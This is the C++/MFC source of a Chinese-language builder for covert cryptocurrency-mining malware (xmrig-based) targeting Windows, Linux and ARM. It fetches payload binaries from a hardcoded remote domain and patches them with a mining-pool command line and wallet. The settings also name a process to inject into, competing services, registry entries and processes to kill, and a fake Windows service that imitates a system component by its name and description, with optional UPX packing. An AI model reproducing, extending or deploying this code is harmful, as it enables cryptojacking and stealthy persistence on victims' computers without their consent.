

#include "stdafx.h"
#include "xxs.h"
#include "xxsDlg.h"
#define MAX_LENGTH 256
#include "STRING.H"
#include <stdio.h>     
#include <afxinet.h> 
#include <stdio.h> 
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
	CString Noticeurl = "http://km.xn--pssa2683b.top/gg.txt";  //这个是公告地址

	CString LatestVersion = "http://km.xn--pssa2683b.top/scq.txt";  //最新生成器版本

	CString UpdateDate = "http://km.xn--pssa2683b.top/riqi.txt";  //挖矿程序更新日期

	CString CurrentVersion = "2.4";//目前生成器版本
	
	CString downloadLink = "http://km.xn--pssa2683b.top/scq.exe";//生成器下载地址
	
	CString ProgramDownloadURL = "http://km.xn--pssa2683b.top/linux";//linux程序下载地址
	
	CString Winprogramdownload = "http://km.xn--pssa2683b.top/win";//win程序下载地址

/////////////////////////////////////////////////////////////////////////////
// CMyDlg dialog

CMyDlg::CMyDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CMyDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMyDlg)



	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMyDlg)
	
	DDX_Check(pDX, IDC_UPX, UPX);
	DDX_Text(pDX, IDC_SET_DIS, m_serdis);
	DDX_Text(pDX, IDC_SET_DIS2, filename);
	DDX_Text(pDX, IDC_EDIT6, wininj);
	DDX_Text(pDX, IDC_EDIT7, service);
	DDX_Text(pDX, IDC_EDIT8, Registry);
	DDX_Text(pDX, IDC_EDIT9, winProcess);
	DDX_Text(pDX, IDC_EDIT10, linuxProcess);
	DDX_Text(pDX, IDC_EDIT_SVCNAME, m_svcname);
	DDX_Text(pDX, IDC_EDIT_SHELP, m_shelp);
	DDX_Text(pDX, IDC_EDIT_SCNAME, m_scname);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CMyDlg, CDialog)
	//{{AFX_MSG_MAP(CMyDlg)
	ON_WM_PAINT()
	ON_BN_CLICKED(IDC_xxs, Onxxs)
	ON_EN_CHANGE(IDC_EDIT3, OnChangeEdit3)
	ON_BN_CLICKED(IDC_BUTTON1, OnButton1)
	ON_BN_CLICKED(IDOK2, OnOk2)
	ON_EN_CHANGE(IDC_SET_DIS, OnChangeSetDis)
	ON_BN_CLICKED(IDOK3, OnOk3)
	ON_EN_CHANGE(IDC_SET_DIS2, OnChangeSetDis2)
	ON_BN_CLICKED(IDC_BUTTON2, OnButton2)
	ON_BN_CLICKED(IDC_BUTTON3, OnButton3)
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_HELP, OnHelp)
	ON_BN_CLICKED(IDCANCEL2, OnCancel2)
	ON_BN_CLICKED(IDC_RANDOM, OnRandom)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyDlg message handlers

BOOL CMyDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	OnCancel2();
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.
CString GetString(CString AppName,CString KeyName)
{
	TCHAR buf[MAX_LENGTH];
	::GetPrivateProfileString(AppName, KeyName, NULL, buf, sizeof(buf), ".\\xxs.ini");
	return buf;
}
// 判断文件是否存在
BOOL IsFileExist(const CString& csFile)
{
    DWORD dwAttrib = GetFileAttributes(csFile);
    return INVALID_FILE_ATTRIBUTES != dwAttrib && 0 == (dwAttrib & FILE_ATTRIBUTE_DIRECTORY);
}

CString DownloadContent(CString url)//获取网页内容
{
	CString PageData;
	if (strcmp(GetString(_T("xxs"),_T("lx")),"yes"))//判断ini
	{
		CInternetSession Session(NULL,0);
		CString TempData;
		CHttpFile*HttpFile=(CHttpFile*)Session.OpenURL(url);
		while(HttpFile->ReadString(TempData))
		{
			PageData+=TempData;
		}
		HttpFile->Close();
		delete HttpFile;
		Session.Close();
		//这里返回的网页源码是UTF8格式,要转成ANSI等编码才能正常显示
		return PageData;
	} 
	else
	{	
		PageData ="当前是离线模式";
		return PageData;
	}
}

void update()
{
	char * Transformation = (char*)DownloadContent(LatestVersion).GetBuffer(0);
	if (strcmp(Transformation,CurrentVersion))//判断下最新版本跟目前的版本是否相同
	{
		URLDownloadToFile(NULL,downloadLink, "新版生成器.exe", 0, NULL); //下载 
		MessageBox(NULL,"生成器版本已更新","提示",MB_OK); 
	}
	
}

void CMyDlg::OnPaint() 
{

	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1 ) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}

    //公告地址
	SetDlgItemText(IDC_EDIT2,DownloadContent(Noticeurl));//公告
	Sleep(50);
	SetDlgItemText(IDC_EDIT3,CurrentVersion);//当前生成器版本
	Sleep(50);
	SetDlgItemText(IDC_EDIT4,DownloadContent(LatestVersion));//最新生成器版本
	Sleep(50);
	SetDlgItemText(IDC_EDIT5,DownloadContent(UpdateDate));//挖矿程序更
	Sleep(50);
	if (IsFileExist("xxs.ini")==false)//判断文件是否存在
	{
		SetDlgItemText(IDC_SET_DIS," -B -o stratum+tcp://矿池地址 -u 钱包地址 -p x -k ");
		SetDlgItemText(IDC_SET_DIS2,"this");
		SetDlgItemText(IDC_EDIT6,"0");//注入进程
		SetDlgItemText(IDC_EDIT7,"0");//k服务
		SetDlgItemText(IDC_EDIT8,"0");//k注册表
		SetDlgItemText(IDC_EDIT9,"0");//k进程
		SetDlgItemText(IDC_EDIT10,"xmrig:mine");//klinux进程
		char chSvcName[128]={0},chSvcnName[128]={0},chHelpName[128]={0};
		wsprintf(chSvcName,"%c%c%c",'a'+rand()%25,'a'+rand()%25,'a'+rand()%25);
		wsprintf(chSvcnName,"%c%c%c for Windows(R).",'a'+rand()%25,'a'+rand()%25,'a'+rand()%25);
		wsprintf(chHelpName,"管理基于组件对象模型的核心服务。如果服务被禁用，计算机将无法正常运行。");
		SetDlgItemText(IDC_EDIT_SVCNAME, chSvcName);
		SetDlgItemText(IDC_EDIT_SCNAME, chSvcnName);
		SetDlgItemText(IDC_EDIT_SHELP, chHelpName);
	}
	else
	{
		SetDlgItemText(IDC_SET_DIS,GetString(_T("xxs"),_T("wallet")));
		SetDlgItemText(IDC_SET_DIS2,GetString(_T("xxs"),_T("filename")));
		SetDlgItemText(IDC_EDIT6,"0");//注入进程
		SetDlgItemText(IDC_EDIT7,GetString(_T("xxs"),_T("service")));//k服务
		SetDlgItemText(IDC_EDIT8,GetString(_T("xxs"),_T("service")));//k注册表
		SetDlgItemText(IDC_EDIT9,GetString(_T("xxs"),_T("winProcess")));//k进程
		SetDlgItemText(IDC_EDIT10,GetString(_T("xxs"),_T("linuxProcess")));//klinux进程
		SetDlgItemText(IDC_EDIT_SVCNAME, GetString(_T("xxs"),_T("SerName")));
		SetDlgItemText(IDC_EDIT_SCNAME, GetString(_T("xxs"),_T("Serdisplay")));
		SetDlgItemText(IDC_EDIT_SHELP, GetString(_T("xxs"),_T("Serdesc")));
	}
	//	UpdateWindow();
}



// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CMyDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}


 struct FALLEN_DATA
{
	unsigned int finder;
	char xxs[1000];			//运行命令
	char filename[255];		//释放的文件名
	char service[255];		//k的服务名
	char Registry[255];		//k的注册表名
	char winProcess[255];	//k的win进程名
	char linuxProcess[255]; //k的linux进程名
	char wininj[100];		//注入的win进程
	char SerName[100];		//服务名称
	char Serdisplay[128];	//显示名称
	char Serdesc[256];		//服务描述
}
fallen_data =
{
	0xF9E28F8D,
	"xxs",
	"filename",
	"123:456",
	"123",
	"abc.exe",
	"abc",
	"wps.exe",
	"fuwmc",
	"xiansmc",
	"fuwumiaosu"
};

//放到一起
void CMyDlg::build(CString file)
{
	UpdateData(TRUE);
	//	DeleteFile("xxskm");
	CString file2 ="\\\\";
	char *file1 =(LPSTR)(LPCTSTR)file2;

	strcat(file1,file);
	m_serdis.Replace("-B", " -B");//ini读取时，会漏掉空格.
	strcpy(fallen_data.xxs,m_serdis.GetBuffer(0));
	strcpy(fallen_data.filename,filename.GetBuffer(0));//挖矿文件名
	strcpy(fallen_data.service,service.GetBuffer(0));//要k的服务
	strcpy(fallen_data.Registry,Registry.GetBuffer(0));//要k的注册表
	strcpy(fallen_data.winProcess,winProcess.GetBuffer(0));//要k的Windows进程
	strcpy(fallen_data.linuxProcess,linuxProcess.GetBuffer(0));//要k的linux进程
	strcpy(fallen_data.wininj,wininj.GetBuffer(0));//要注入的win进程
	strcpy(fallen_data.SerName, m_svcname.GetBuffer(0));
	strcpy(fallen_data.Serdisplay, m_scname.GetBuffer(0));
	strcpy(fallen_data.Serdesc, m_shelp.GetBuffer(0));

	char Path[MAX_PATH];
	GetCurrentDirectory(MAX_PATH,Path);
	strcat(Path,file1);
	CFile oldfile;
	if (!oldfile.Open(Path,CFile::modeRead | CFile::typeBinary))
		return;
	DWORD oldfilesize = oldfile.GetLength();
	BYTE *buf = (BYTE *)malloc(oldfile.GetLength());
	memset(buf,0,oldfile.GetLength());
	oldfile.Read(buf,oldfile.GetLength());
	oldfile.Close();

    unsigned int i, k;
	for (i = 0; i < oldfilesize - sizeof(fallen_data.finder); i += sizeof(fallen_data.finder))
    {
		for (k = 0; k < sizeof(fallen_data.finder); k++)
		{
			if (buf[i+k] != ((BYTE*)&fallen_data.finder)[k])
				break;
		}
		if (k == sizeof(fallen_data.finder))
		{
			memcpy(buf+ i, &fallen_data, sizeof(fallen_data));
			break;
		}
    }
	
	if (i >= oldfilesize - sizeof(fallen_data.finder))
    {
        free(buf);
        MessageBox("写入信息到文件中，不能定位自身文件而出错!","错误");
		return;
    }
	CString filetmp1 ="ok";
	char *filetmp =(LPSTR)(LPCTSTR)filetmp1;
	strcat(filetmp,file);
	CFile newfile;
	newfile.Open(filetmp,CFile::modeCreate | CFile::modeReadWrite | CFile::typeBinary);
	newfile.Write(buf,oldfilesize);
	free(buf);
	newfile.Close();
	CString filena ="生成成功!文件：";
	char *filenaz =(LPSTR)(LPCTSTR)filena;
	strcat(filenaz,filetmp);
	MessageBox(filenaz,"提示");
	if (UPX)
	{
		ShellExecuteA(NULL, "open", "upx.exe",filetmp, NULL, NULL);//upx压缩
		MessageBox("upx压缩成功","提示");
	}
	//保存ini配置
	WritePrivateProfileString(_T("xxs"),_T("wallet"),m_serdis,_T(".\\xxs.ini"));
	WritePrivateProfileString(_T("xxs"),_T("filename"),filename,_T(".\\xxs.ini"));
	WritePrivateProfileString(_T("xxs"),_T("service"),service,_T(".\\xxs.ini"));
	WritePrivateProfileString(_T("xxs"),_T("Registry"),Registry,_T(".\\xxs.ini"));
	WritePrivateProfileString(_T("xxs"),_T("winProcess"),winProcess,_T(".\\xxs.ini"));
	WritePrivateProfileString(_T("xxs"),_T("linuxProcess"),linuxProcess,_T(".\\xxs.ini"));
	WritePrivateProfileString(_T("xxs"),_T("SerName"),m_svcname,_T(".\\xxs.ini"));
	WritePrivateProfileString(_T("xxs"),_T("Serdisplay"),m_scname,_T(".\\xxs.ini"));
	WritePrivateProfileString(_T("xxs"),_T("Serdesc"),m_shelp,_T(".\\xxs.ini"));

}



void CMyDlg::OnOK() 
{
//	str.TrimRight();消除字符串空格，不过已经没用了哈哈哈哈哈
	build("xxs");

//	CDialog::OnOK();
}


void CMyDlg::Onxxs() 
{
	DeleteFile("xxs");
	URLDownloadToFile(NULL,ProgramDownloadURL, "xxs", 0, NULL); //下载 
	DeleteFile("xxs.exe");
	URLDownloadToFile(NULL,Winprogramdownload, "xxs.exe", 0, NULL);
	MessageBox("程序已更新","提示"); 
	// TODO: Add your control notification handler code here
	
}

void CMyDlg::OnChangeEdit3() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here

	
    //公告地址
	
	
}

void CMyDlg::OnButton1() 
{
	// TODO: Add your control notification handler code here
	URLDownloadToFile(NULL,downloadLink, "xxsgx.exe", 0, NULL); //下载 
	MessageBox("生成器版本已更新","提示"); 
}

void CMyDlg::OnOk2() 
{
	// TODO: Add your control notification handler code here

	build("xxs.exe");

}


#include <wininet.h>
//
// 删除全部Internet临时文件子目录中的文件。
//
// 注释：你能够通过测试入口类型（entry type）指定什么不被删除。
// 下面的代码，cookie入口将不被删除。
// 如：[if (!(lpCacheEntry->CacheEntryType & COOKIE_CACHE_ENTRY))]
//
void Deletecaching()
{
    BOOL bResult = FALSE;
    BOOL bDone = FALSE;
    LPINTERNET_CACHE_ENTRY_INFO lpCacheEntry = NULL;
	
    DWORD  dwTrySize, dwEntrySize = 4096; // start buffer size
    HANDLE hCacheDir = NULL;
    DWORD  dwError = ERROR_INSUFFICIENT_BUFFER;
	
    do
    {
        switch (dwError)
        {
            // need a bigger buffer
		case ERROR_INSUFFICIENT_BUFFER:
			delete [] lpCacheEntry;
			lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO) new char[dwEntrySize];
			lpCacheEntry->dwStructSize = dwEntrySize;
			dwTrySize = dwEntrySize;
			BOOL bSuccess;
			if (hCacheDir == NULL)
				
				bSuccess = (hCacheDir
				= FindFirstUrlCacheEntry(NULL, lpCacheEntry,
				&dwTrySize)) != NULL;
			else
				bSuccess = FindNextUrlCacheEntry(hCacheDir, lpCacheEntry, &dwTrySize);
			
			if (bSuccess)
				dwError = ERROR_SUCCESS;
			else
			{
				dwError = GetLastError();
				dwEntrySize = dwTrySize; // use new size returned
			}
			break;
			
			// we are done
		case ERROR_NO_MORE_ITEMS:
			bDone = TRUE;
			bResult = TRUE;
			break;
			
			// we have got an entry
		case ERROR_SUCCESS:
			
			// don't delete cookie entry
			if (!(lpCacheEntry->CacheEntryType & COOKIE_CACHE_ENTRY))
				
				DeleteUrlCacheEntry(lpCacheEntry->lpszSourceUrlName);
			
			// get ready for next entry
			dwTrySize = dwEntrySize;
			if (FindNextUrlCacheEntry(hCacheDir, lpCacheEntry, &dwTrySize))
				dwError = ERROR_SUCCESS;
			
			else
			{
				dwError = GetLastError();
				dwEntrySize = dwTrySize; // use new size returned
			}
			break;
			
            // unknown error
		default:
			bDone = TRUE;
			break;
        }
		
        if (bDone)
        {
            delete [] lpCacheEntry;
            if (hCacheDir)
                FindCloseUrlCache(hCacheDir);
			
        }
    } while (!bDone);
//    return bResult;
}
void CMyDlg::OnChangeSetDis3() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	
}

void CMyDlg::OnChangeSetDis4() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	
}

void CMyDlg::OnChangeSetDis2() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	
}

void CMyDlg::OnChangeSetDis() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	
}

void CMyDlg::OnOk3() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	build("armxxs");
	
//	CDialog::OnOK();
}

void CMyDlg::OnOk4() 
{
	UpdateData(TRUE);
	//兼容cnrig
	// TODO: Add your control notification handler code here
	build("jtxxs");
}

void CMyDlg::OnButton2() 
{
	// TODO: Add your control notification handler code here
	WritePrivateProfileString(_T("xxs"),_T("lx"),"yes",_T(".\\xxs.ini"));
	MessageBox("重启生效","提示"); 
}

void CMyDlg::OnButton3() 
{
	WritePrivateProfileString(_T("xxs"),_T("lx"),"no",_T(".\\xxs.ini"));
	MessageBox("重启生效","提示"); 
	// TODO: Add your control notification handler code here
	
}

void CMyDlg::OnButton4() 
{
	// TODO: Add your control notification handler code here

	
}

void CMyDlg::OnHelp() 
{
	// TODO: Add your control notification handler code here
	MessageBox("linux(官方)：2.6.4内核，兼容性不错（基本全系统兼容）.\nlinux（兼容）：全系统兼容，内核版本2.6.0bate3. \narm（1）2.6.4最新内核,arm暂停使用.","提示"); 
}

void CMyDlg::OnCancel2() 
{
	// TODO: Add your control notification handler code here
	static BOOL bShow = TRUE;
	RECT rct;
	GetWindowRect(&rct);
	bShow = !bShow;
	
	if	(bShow)
		rct.right = rct.right + 300;
	else
		rct.right = rct.right - 300;
	MoveWindow(&rct, TRUE);
	InvalidateRect(NULL);
	UpdateWindow();
}

void CMyDlg::OnRandom() 
{
	// TODO: Add your control notification handler code here
	
}
